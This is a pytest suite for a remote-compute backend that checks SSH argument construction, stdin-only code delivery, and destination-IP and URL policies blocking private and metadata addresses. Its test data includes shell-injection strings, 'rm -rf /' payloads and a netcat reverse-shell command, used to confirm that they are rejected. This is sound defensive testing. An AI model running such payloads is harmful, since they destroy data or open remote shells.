"""A48 remote-compute security tests (Phase 4 hardening).

Level 1: fail-closed configuration parsing.
Level 2: transport integrity — user code (even malicious code) may
         only ever reach the remote end over stdin, never via argv or
         a shell; host-key verification is mandatory; destinations
         must be allowlisted.
Level 3: destination-IP policy — the configured hostname is resolved
         and EVERY returned address is classified before any
         connection; loopback/private/link-local/cloud-metadata/
         reserved destinations are refused unless the operator
         explicitly opts in; unresolvable hosts fail closed.
Level 4: kernel-proxy (FORGE_COLAB_URL) URL policy — parse ->
         normalize -> policy -> DNS/IP safety before connect, no
         bypass.
"""
from __future__ import annotations

import os
import shlex
import socket
import stat
import subprocess
import sys
from pathlib import Path

import pytest

from forge.compute.remote import (
    MAX_OUTPUT,
    RemoteComputeBackend,
    RemoteComputeError,
    SSHConfig,
    _execute_ssh_secure,
    _ssh_argv,
    classify_destination,
    colab_url_policy,
    parse_ssh_config,
    ssh_destination_policy,
)

BASE_ENV = {
    "FORGE_COMPUTE_SSH_HOST": "deploy@compute.example.org",
    "FORGE_COMPUTE_SSH_USER": "deploy",
    "FORGE_COMPUTE_SSH_PORT": "",
    "FORGE_COMPUTE_SSH_ALLOWLIST": "compute.example.org,deploy@compute.example.org",  # noqa: E501
    "FORGE_COMPUTE_SSH_KNOWN_HOSTS": "/tmp/forge_known_hosts",
    "FORGE_COMPUTE_SSH_IDENTITY": "",
}


@pytest.fixture(autouse=True)
def _clean_ssh_env(monkeypatch):
    """All SSH tests start from a strict-but-valid configuration."""
    for key in list(os.environ):
        if key.startswith("FORGE_COMPUTE_SSH_") or \
                key in ("MODAL_TOKEN_ID", "MODAL_TOKEN_SECRET",
                        "FORGE_COLAB_URL", "FORGE_COLAB_ALLOW_HTTP",
                        "FORGE_COLAB_ALLOW_LOCALHOST",
                        "FORGE_COLAB_ALLOW_PRIVATE"):
            monkeypatch.delenv(key, raising=False)
    for key, value in BASE_ENV.items():
        if value:
            monkeypatch.setenv(key, value)
    monkeypatch.setenv("HOME", "/tmp")


# ---------------------------------------------------------------------------
# Level 1 — configuration is fail-closed
# ---------------------------------------------------------------------------

def test_valid_config_parses() -> None:
    config = parse_ssh_config()
    assert config.user == "deploy"
    assert config.host == "compute.example.org"
    assert config.port == 22
    assert config.allowed()


def test_missing_allowlist_refuses() -> None:
    os.environ.pop("FORGE_COMPUTE_SSH_ALLOWLIST")
    with pytest.raises(RemoteComputeError, match="ALLOWLIST"):
        parse_ssh_config()


def test_host_not_in_allowlist_is_refused() -> None:
    os.environ["FORGE_COMPUTE_SSH_HOST"] = "evil.example.org"
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "compute.example.org"
    config = parse_ssh_config()  # parses structurally…
    assert config.allowed() is False  # …but is refused by the allowlist
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "evil.example.org"
    assert parse_ssh_config().allowed() is True


def test_user_required() -> None:
    os.environ["FORGE_COMPUTE_SSH_HOST"] = "compute.example.org"
    os.environ.pop("FORGE_COMPUTE_SSH_USER")
    with pytest.raises(RemoteComputeError, match="user"):
        parse_ssh_config()


def test_host_pattern_rejects_injection() -> None:
    for hostile in ("host;rm -rf /", "host$(id)", "`touch /tmp/pwned`",
                    "host|nc 10.0.0.1 4444", "-oProxyCommand=cat",
                    "a b", "user@host@x"):
        os.environ["FORGE_COMPUTE_SSH_HOST"] = hostile
        with pytest.raises(RemoteComputeError):
            parse_ssh_config()


def test_allowlist_entries_are_validated() -> None:
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "ok.example.com;$();id"
    with pytest.raises(RemoteComputeError, match="allowlist entry"):
        parse_ssh_config()


def test_argv_never_contains_user_code() -> None:
    config = parse_ssh_config()
    argv = _ssh_argv(config)
    assert argv[0] == "ssh"
    joined = shlex.join(argv)
    # The remote command is the constant, safe tail.
    assert argv[-3:] == [config.target, "python3", "-I", "-"][-3:] or \
        argv[-4:] == [config.target, "python3", "-I", "-"]
    assert "python3" in argv and "-" in argv
    # Strict host-key checking is mandatory and BatchMode disables prompts.
    assert "-o" in argv
    assert "StrictHostKeyChecking=no" not in argv
    assert "StrictHostKeyChecking=yes" in argv
    assert "BatchMode=yes" in argv
    assert "UserKnownHostsFile=/tmp/forge_known_hosts" in argv
    assert ";rm" not in joined and "$(" not in joined and "`" not in joined


@pytest.mark.parametrize("evil_code", [
    "print('hi'); __import__('os').system('rm -rf /')",
    "'; rm -rf / #",
    "$(id)",
    "`touch /tmp/pwned`",
    "import os; os.system('nc -e /bin/sh 10.0.0.1 4444')",
    "a' ; b'",
    "x\" ; y\"",
])
def test_malicious_code_never_enters_argv(evil_code: str) -> None:
    config = SSHConfig(
        user="deploy", host="compute.example.org", port=22,
        allowlist=("compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")
    argv = _ssh_argv(config)
    # The argv is built only from constants + pattern-validated config:
    # it must not contain any of the user code as a whole…
    assert evil_code not in " ".join(argv)
    # …and none of the shell metacharacters the code relies on appear in
    # any argv token (argv elements are shell-free by construction).
    assert not any(ch in token for token in argv for ch in ";$`'\""), (
        f"shell metacharacter leaked into argv: {argv}")


# ---------------------------------------------------------------------------
# Level 2 — the transport only carries code over stdin
# ---------------------------------------------------------------------------

def test_transport_delivers_code_only_over_stdin(tmp_path: Path) -> None:
    """A fake `ssh` records argv + stdin; code must arrive only on stdin."""
    record = tmp_path / "record.jsonl"
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    launcher.write_text(
        f"#!{sys.executable}\n"
        "import json, os, sys\n"
        "argv = list(sys.argv[1:])\n"
        "data = sys.stdin.buffer.read()\n"
        "with open(os.environ['FAKE_SSH_RECORD'], 'w') as fh:\n"
        "    fh.write(json.dumps({'argv': argv,\n"
        "                         'stdin': data.decode('utf-8')}))\n",
        encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)

    config = SSHConfig(
        user="deploy", host="compute.example.org", port=22,
        allowlist=("deploy@compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")

    evil_code = ("import os\n"
                 "os.system('echo pwned > /tmp/escaped') # ' ; echo hacked\n"
                 "print('ok')\n")
    env = dict(os.environ)
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"
    env["FAKE_SSH_RECORD"] = str(record)
    result = _execute_ssh_secure(evil_code, config, timeout=10.0,
                                 env=env)
    # The fake ssh exits 0, so the backend reports success.
    assert result["status"] == "succeeded"

    import json
    assert record.exists(), "fake ssh never ran"
    payload = json.loads(record.read_text(encoding="utf-8"))
    argv = payload["argv"]
    received_stdin = payload["stdin"]

    # The ssh client must have used the strict, pinned transport.
    assert "StrictHostKeyChecking=yes" in argv
    assert "BatchMode=yes" in argv
    assert argv[-4:] == ["deploy@compute.example.org", "python3", "-I", "-"]
    # The code arrives byte-for-byte on stdin — nowhere else.
    assert received_stdin == evil_code
    joined = " ".join(argv)
    assert evil_code not in joined
    assert not any(ch in token for token in argv for ch in ";$`'\""), (
        f"shell metacharacter leaked into ssh argv: {argv}")


def test_timeout_kills_whole_process_group(tmp_path: Path) -> None:
    """A hanging remote is cancelled via the process group, not leaked."""
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    # Fake ssh that ignores SIGTERM initially to force SIGKILL escalation.
    launcher.write_text(
        "#!/bin/sh\ntrap '' TERM\nsleep 60\n", encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)
    config = SSHConfig(
        user="deploy", host="compute.example.org",
        allowlist=("compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")
    env = dict(os.environ)
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"

    import time
    started = time.monotonic()
    result = _execute_ssh_secure("print('x')", config, timeout=2.0,
                                 env=env)
    assert result["status"] == "timeout"
    assert result["timed_out"] is True
    assert time.monotonic() - started < 15
    assert "timed out" in result["output"]


def test_output_is_bounded(tmp_path: Path) -> None:
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    launcher.write_text(
        "#!/bin/sh\nhead -c 100000 /dev/zero | tr '\\0' 'A'\n",
        encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)
    config = SSHConfig(
        user="deploy", host="compute.example.org",
        allowlist=("compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")
    env = dict(os.environ)
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"
    result = _execute_ssh_secure("print('x')", config, timeout=10.0,
                                 env=env)
    assert result["status"] == "succeeded"
    assert len(result["output"]) <= MAX_OUTPUT


def test_missing_known_hosts_file_fails_closed() -> None:
    """No known_hosts means host-key verification cannot pass; the call
    must fail via the strict ssh options rather than silently downgrade."""
    config = SSHConfig(
        user="deploy", host="compute.example.org",
        allowlist=("compute.example.org",),
        known_hosts="/nonexistent/known_hosts")
    argv = _ssh_argv(config)
    assert "StrictHostKeyChecking=yes" in argv
    assert any(arg == "UserKnownHostsFile=/nonexistent/known_hosts"
               for arg in argv), argv


def test_backend_refuses_when_not_allowlisted(monkeypatch) -> None:
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "other.example.org"
    backend = RemoteComputeBackend()
    assert backend.available() is False
    result = backend.execute("print(1)")
    assert result["status"] == "refused"
    assert "ALLOWLIST" in result["output"]


# ---------------------------------------------------------------------------
# Level 3 — destination-IP policy: every resolved address is classified
# before any connection; non-public destinations need an explicit
# operator opt-in; unresolvable hosts fail closed.
# ---------------------------------------------------------------------------

def _infos(*ips: str) -> list:
    """Build fake socket.getaddrinfo-style records for ``ips``."""
    records = []
    for ip in ips:
        family = socket.AF_INET6 if ":" in ip else socket.AF_INET
        records.append((family, socket.SOCK_STREAM, 6, "", (ip, 0)))
    return records


def _ssh_config(host: str, *, allowlist: str | None = None) -> SSHConfig:
    return SSHConfig(user="deploy", host=host, port=22,
                     allowlist=tuple((allowlist or host).split(",")),
                     known_hosts="/tmp/forge_known_hosts")


def _patch_resolver(monkeypatch, addresses: list[str] | None = None,
                    *, error: bool = False):
    """Replace the module resolver with a deterministic stub."""
    import forge.compute.remote as remote

    def resolver(host):  # noqa: ANN001
        if error:
            raise socket.gaierror(socket.EAI_NONAME,
                                  "Name or service not known")
        return _infos(*addresses)

    monkeypatch.setattr(remote, "_host_resolver", resolver)


@pytest.mark.parametrize("ip_text,expected_class", [
    ("8.8.8.8", "public"),
    ("2606:4700:4700::1111", "public"),
    ("10.0.0.5", "private"),
    ("192.168.1.10", "private"),
    ("172.16.0.1", "private"),
    ("fd00::1", "private"),
    ("127.0.0.1", "loopback"),
    ("::1", "loopback"),
    ("0.0.0.0", "this-host"),
    ("169.254.10.10", "link-local"),
    ("fe80::1", "link-local"),
    ("169.254.169.254", "cloud-metadata"),
    ("100.64.0.1", "cg-nat"),
    ("224.0.0.1", "multicast"),
    ("ff02::1", "multicast"),
    ("203.0.113.7", "documentation"),
    ("2001:db8::1", "documentation"),
    ("198.18.0.1", "benchmark"),
    ("::ffff:10.0.0.1", "private"),  # IPv4-mapped rechecked as IPv4
])
def test_classify_destination_literals(ip_text: str,
                                       expected_class: str) -> None:
    """IP literals are classified directly — no DNS, offline-deterministic."""
    import ipaddress
    canonical = str(ipaddress.ip_address(ip_text))
    entries, error = classify_destination(ip_text)
    assert error == ""
    assert entries == [{"address": canonical, "class": expected_class}]


def test_classify_destination_resolves_every_address(monkeypatch) -> None:
    """A hostname may return many addresses; ALL are classified."""
    _patch_resolver(monkeypatch, ["8.8.8.8", "2001:4860:4860::8888",
                                  "8.8.4.4"])
    entries, error = classify_destination("dns.google")
    assert error == ""
    assert {e["class"] for e in entries} == {"public"}
    assert len(entries) == 3


def test_classify_destination_unresolvable_fails_closed(monkeypatch) -> None:
    _patch_resolver(monkeypatch, error=True)
    entries, error = classify_destination("no-such-host.invalid")
    assert entries == []
    assert "could not be resolved" in error


def test_ssh_destination_policy_public_host_passes(monkeypatch) -> None:
    """A host that resolves only to public addresses passes the gate."""
    _patch_resolver(monkeypatch, ["8.8.8.8", "2606:4700:4700::1111"])
    config = _ssh_config("compute.example.org")
    entries = ssh_destination_policy(config)
    assert {e["class"] for e in entries} == {"public"}


def test_ssh_destination_private_resolution_refused(monkeypatch) -> None:
    """Private resolution is refused without the operator opt-in — even
    though the hostname is on the allowlist (allowlist alone never
    bypasses the resolved-IP policy)."""
    _patch_resolver(monkeypatch, ["10.0.0.5"])
    config = _ssh_config("compute.example.org")
    with pytest.raises(RemoteComputeError,
                       match=r"10\.0\.0\.5 \(private\)") as exc:
        ssh_destination_policy(config)
    assert "FORGE_COMPUTE_SSH_ALLOW_PRIVATE" in str(exc.value)


def test_ssh_destination_private_opt_in_allows(monkeypatch) -> None:
    """FORGE_COMPUTE_SSH_ALLOW_PRIVATE=1 is the explicit
    operator-controlled private-network exception."""
    _patch_resolver(monkeypatch, ["10.0.0.5"])
    os.environ["FORGE_COMPUTE_SSH_ALLOW_PRIVATE"] = "1"
    config = _ssh_config("compute.example.org")
    entries = ssh_destination_policy(config)
    assert entries[0]["class"] == "private"


@pytest.mark.parametrize("ip_text,ip_class", [
    ("127.0.0.1", "loopback"),
    ("::1", "loopback"),
    ("169.254.10.10", "link-local"),
    ("fe80::1", "link-local"),
    ("0.0.0.0", "this-host"),
])
def test_ssh_destination_local_classes_refused_without_opt_in(
        monkeypatch, ip_text: str, ip_class: str) -> None:
    _patch_resolver(monkeypatch, [ip_text])
    config = _ssh_config("compute.example.org")
    with pytest.raises(RemoteComputeError,
                       match=rf"{ip_text} \({ip_class}\)"):
        ssh_destination_policy(config)
    # …and permitted under the explicit exception.
    os.environ["FORGE_COMPUTE_SSH_ALLOW_PRIVATE"] = "1"
    assert ssh_destination_policy(config)


def test_ssh_destination_mixed_public_private_refused(monkeypatch) -> None:
    """One private answer poisons the whole destination (fail-closed)."""
    _patch_resolver(monkeypatch, ["8.8.8.8", "10.0.0.5", "192.168.0.9"])
    config = _ssh_config("compute.example.org")
    with pytest.raises(RemoteComputeError) as exc:
        ssh_destination_policy(config)
    message = str(exc.value)
    assert "10.0.0.5 (private)" in message
    assert "192.168.0.9 (private)" in message
    assert "8.8.8.8" not in message.split("non-public")[1].split(";")[0]


def test_ssh_destination_metadata_never_allowed(monkeypatch) -> None:
    """169.254.169.254 stays refused even with the private opt-in."""
    _patch_resolver(monkeypatch, ["169.254.169.254"])
    os.environ["FORGE_COMPUTE_SSH_ALLOW_PRIVATE"] = "1"
    config = _ssh_config("compute.example.org")
    with pytest.raises(RemoteComputeError,
                       match="never-routed|refused even with"):
        ssh_destination_policy(config)


def test_ssh_destination_multicast_never_allowed(monkeypatch) -> None:
    _patch_resolver(monkeypatch, ["224.0.0.1"])
    os.environ["FORGE_COMPUTE_SSH_ALLOW_PRIVATE"] = "1"
    with pytest.raises(RemoteComputeError):
        ssh_destination_policy(_ssh_config("compute.example.org"))


def test_backend_refuses_unresolvable_ssh_host(monkeypatch) -> None:
    """The backend never starts a transport for an unresolvable host."""
    _patch_resolver(monkeypatch, error=True)
    backend = RemoteComputeBackend()
    result = backend.execute("print(1)")
    assert result["status"] == "refused"
    assert result["backend"] == "ssh-remote"
    assert "could not be resolved" in result["output"]
    assert "fail-closed" in result["output"]


@pytest.mark.parametrize("ip_text,ip_class", [
    ("10.0.0.5", "private"),
    ("127.0.0.1", "loopback"),
    ("169.254.10.10", "link-local"),
])
def test_backend_refuses_allowlisted_non_public_literal(
        monkeypatch, ip_text: str, ip_class: str) -> None:
    """Even an allowlisted literal destination is refused by the
    destination-IP policy (literals need no DNS, so this is
    deterministic offline)."""
    os.environ["FORGE_COMPUTE_SSH_HOST"] = f"deploy@{ip_text}"
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = f"{ip_text},deploy@{ip_text}"
    backend = RemoteComputeBackend()
    assert backend.available() is True  # allowlisted…
    result = backend.execute("print(1)")
    assert result["status"] == "refused"  # …but refused by IP policy
    assert ip_class in result["output"]


def test_backend_private_opt_in_reaches_transport(tmp_path: Path,
                                                   monkeypatch) -> None:
    """With the explicit operator exception the transport may start and
    still carries code only over stdin."""
    record = tmp_path / "record.jsonl"
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    launcher.write_text(
        f"#!{sys.executable}\n"
        "import json, os, sys\n"
        "argv = list(sys.argv[1:])\n"
        "data = sys.stdin.buffer.read()\n"
        "with open(os.environ['FAKE_SSH_RECORD'], 'w') as fh:\n"
        "    fh.write(json.dumps({'argv': argv,\n"
        "                         'stdin': data.decode('utf-8')}))\n",
        encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)
    os.environ["FORGE_COMPUTE_SSH_HOST"] = "deploy@127.0.0.1"
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "127.0.0.1,deploy@127.0.0.1"
    os.environ["FORGE_COMPUTE_SSH_ALLOW_PRIVATE"] = "1"
    monkeypatch.setenv("PATH", f"{fake_bin}:{os.environ.get('PATH', '')}")
    monkeypatch.setenv("FAKE_SSH_RECORD", str(record))
    monkeypatch.setattr("forge.compute.remote._host_resolver",
                        lambda host: _infos("127.0.0.1"))
    backend = RemoteComputeBackend()
    result = backend.execute("print('ok')", timeout=10.0)
    assert result["status"] == "succeeded"
    import json
    payload = json.loads(record.read_text(encoding="utf-8"))
    assert payload["argv"][-4:] == ["deploy@127.0.0.1", "python3", "-I", "-"]
    assert payload["stdin"] == "print('ok')"


# ---------------------------------------------------------------------------
# Level 4 — kernel-proxy (FORGE_COLAB_URL) URL policy: parse -> normalize
# -> policy -> DNS/IP safety, before any connection.
# ---------------------------------------------------------------------------

def test_colab_url_defaults_to_https_public_literal() -> None:
    url = colab_url_policy("8.8.8.8/kernel")
    assert url == "https://8.8.8.8/kernel"


def test_colab_url_rejects_http_without_opt_in() -> None:
    with pytest.raises(RemoteComputeError, match="ALLOW_HTTP"):
        colab_url_policy("http://8.8.8.8/kernel")
    os.environ["FORGE_COLAB_ALLOW_HTTP"] = "1"
    assert colab_url_policy("http://8.8.8.8/kernel") == \
        "http://8.8.8.8/kernel"


def test_colab_url_rejects_credentials() -> None:
    with pytest.raises(RemoteComputeError, match="credentials"):
        colab_url_policy("https://user:secret@8.8.8.8/kernel")
    with pytest.raises(RemoteComputeError, match="credentials"):
        colab_url_policy("https://user@8.8.8.8/kernel")


def test_colab_url_rejects_bad_scheme_and_missing_host() -> None:
    with pytest.raises(RemoteComputeError):
        colab_url_policy("ftp://8.8.8.8/kernel")
    with pytest.raises(RemoteComputeError, match="no hostname"):
        colab_url_policy("https:///kernel")


def test_colab_url_localhost_needs_local_opt_in(monkeypatch) -> None:
    for local in ("https://localhost/kernel",
                  "https://127.0.0.1/kernel",
                  "https://[::1]/kernel",
                  "https://mybox.local/kernel"):
        with pytest.raises(RemoteComputeError, match="ALLOW_LOCALHOST"):
            colab_url_policy(local)
    # Name-level refusal happens first (offline, no DNS needed); with
    # the opt-in the resolved loopback address is tolerated.
    _patch_resolver(monkeypatch, ["127.0.0.1"])
    os.environ["FORGE_COLAB_ALLOW_LOCALHOST"] = "1"
    assert colab_url_policy("https://localhost/kernel") == \
        "https://localhost/kernel"


def test_colab_url_private_literal_needs_private_opt_in() -> None:
    with pytest.raises(RemoteComputeError, match=r"10\.0\.0\.9 \(private\)"):
        colab_url_policy("https://10.0.0.9/kernel")
    os.environ["FORGE_COLAB_ALLOW_PRIVATE"] = "1"
    assert colab_url_policy("https://10.0.0.9/kernel") == \
        "https://10.0.0.9/kernel"


def test_colab_url_ipv4_mapped_private_literal() -> None:
    with pytest.raises(RemoteComputeError, match=r"private"):
        colab_url_policy("https://[::ffff:10.0.0.9]/kernel")
    os.environ["FORGE_COLAB_ALLOW_PRIVATE"] = "1"
    assert colab_url_policy("https://[::ffff:10.0.0.9]/kernel")


def test_colab_url_metadata_never_allowed_even_with_flags() -> None:
    os.environ["FORGE_COLAB_ALLOW_PRIVATE"] = "1"
    os.environ["FORGE_COLAB_ALLOW_LOCALHOST"] = "1"
    with pytest.raises(RemoteComputeError, match="never-routed|even with"):
        colab_url_policy("https://169.254.169.254/kernel")


def test_colab_url_non_default_port_needs_opt_in() -> None:
    with pytest.raises(RemoteComputeError, match="non-default port 8443"):
        colab_url_policy("https://8.8.8.8:8443/kernel")
    os.environ["FORGE_COLAB_ALLOW_PRIVATE"] = "1"
    assert colab_url_policy("https://8.8.8.8:8443/kernel")
    os.environ.pop("FORGE_COLAB_ALLOW_PRIVATE")
    os.environ["FORGE_COLAB_ALLOW_LOCALHOST"] = "1"
    assert colab_url_policy("https://8.8.8.8:8443/kernel")


def test_colab_url_resolved_private_refused_without_opt_in(
        monkeypatch) -> None:
    """A name that resolves privately is refused even though the URL
    itself looks harmless."""
    _patch_resolver(monkeypatch, ["10.1.2.3"])
    with pytest.raises(RemoteComputeError,
                       match=r"10\.1\.2\.3 \(private\)"):
        colab_url_policy("https://colab.example.org/kernel")


def test_colab_url_resolved_private_opt_in_allows(monkeypatch) -> None:
    _patch_resolver(monkeypatch, ["10.1.2.3"])
    os.environ["FORGE_COLAB_ALLOW_PRIVATE"] = "1"
    assert colab_url_policy("https://colab.example.org/kernel") == \
        "https://colab.example.org/kernel"


def test_colab_url_unresolvable_fails_closed(monkeypatch) -> None:
    _patch_resolver(monkeypatch, error=True)
    with pytest.raises(RemoteComputeError, match="could not be resolved"):
        colab_url_policy("https://no-such-host.invalid/kernel")


def test_colab_url_mixed_resolution_refused(monkeypatch) -> None:
    _patch_resolver(monkeypatch, ["8.8.8.8", "169.254.10.10"])
    with pytest.raises(RemoteComputeError,
                       match=r"169\.254\.10\.10 \(link-local\)"):
        colab_url_policy("https://colab.example.org/kernel")


def test_backend_colab_private_url_refused() -> None:
    os.environ["FORGE_COLAB_URL"] = "https://10.0.0.9/kernel"
    backend = RemoteComputeBackend()
    result = backend.execute("print(1)")
    assert result["status"] == "refused"
    assert result["backend"] == "colab"
    assert "private" in result["output"]


def test_backend_colab_public_url_executes(monkeypatch) -> None:
    """A public literal endpoint passes the policy and reaches the
    (stubbed) kernel proxy over POST /execute."""
    import json
    import urllib.request

    seen: dict = {}

    class _FakeResponse:
        def __init__(self, data: bytes):
            self._data = data

        def read(self, _n: int = -1) -> bytes:
            return self._data

        def __enter__(self):
            return self

        def __exit__(self, *exc) -> None:
            return None

    def fake_urlopen(request, timeout):  # noqa: ANN001
        seen["url"] = request.full_url
        seen["method"] = request.method
        seen["body"] = request.data.decode("utf-8")
        body = json.dumps({"success": True,
                           "output": "forge-verify-ok"}).encode()
        return _FakeResponse(body)

    monkeypatch.setattr(urllib.request, "urlopen", fake_urlopen)
    os.environ["FORGE_COLAB_URL"] = "https://8.8.8.8/kernel"
    backend = RemoteComputeBackend()
    result = backend.execute("print('forge-verify-ok')", timeout=10.0)
    assert result["status"] == "succeeded"
    assert result["backend"] == "colab"
    assert seen["url"] == "https://8.8.8.8/kernel/execute"
    assert seen["method"] == "POST"
    assert "forge-verify-ok" in seen["body"]


def test_ssh_verify_honors_destination_policy(monkeypatch) -> None:
    """A80 verification must refuse a destination whose resolved
    addresses are non-public — the probe never bypasses the policy."""
    from forge.final import provider_verification

    def _must_not_run(*args, **kwargs):  # noqa: ANN002, ANN003
        raise AssertionError("transport must not start for a refused "
                             "destination")

    monkeypatch.setattr("forge.compute.remote._host_resolver",
                        lambda host: _infos("10.0.0.5"))
    monkeypatch.setattr("forge.compute.remote._execute_ssh_secure",
                        _must_not_run)
    result = provider_verification._ssh_verify()
    assert result["state"] == "POLICY_DENIED"
    assert "10.0.0.5 (private)" in result["error"]
    assert "FORGE_COMPUTE_SSH_ALLOW_PRIVATE" in result["error"]


def test_ssh_verify_public_destination_reaches_probe(monkeypatch) -> None:
    from forge.final import provider_verification

    calls: list = []

    def fake_transport(code, config, timeout):  # noqa: ANN001
        calls.append((code, config.host))
        return {"status": "succeeded", "output": "forge-verify-ok",
                "output_truncated": False, "elapsed_ms": 5.0,
                "backend": "ssh-remote", "timed_out": False}

    monkeypatch.setattr("forge.compute.remote._host_resolver",
                        lambda host: _infos("8.8.8.8"))
    monkeypatch.setattr("forge.compute.remote._execute_ssh_secure",
                        fake_transport)
    result = provider_verification._ssh_verify()
    assert result["state"] == "VERIFIED"
    assert len(calls) == 1


def test_colab_verify_honors_url_policy(monkeypatch) -> None:
    """The A80 colab probe reports POLICY_DENIED for a URL that fails
    the parse->normalize->policy->DNS/IP chain (no network touched)."""
    from forge.final import provider_verification

    os.environ["FORGE_COLAB_URL"] = "https://10.0.0.9/kernel"
    result = provider_verification._colab_verify()
    assert result["state"] == "POLICY_DENIED"
    assert "private" in result["error"]
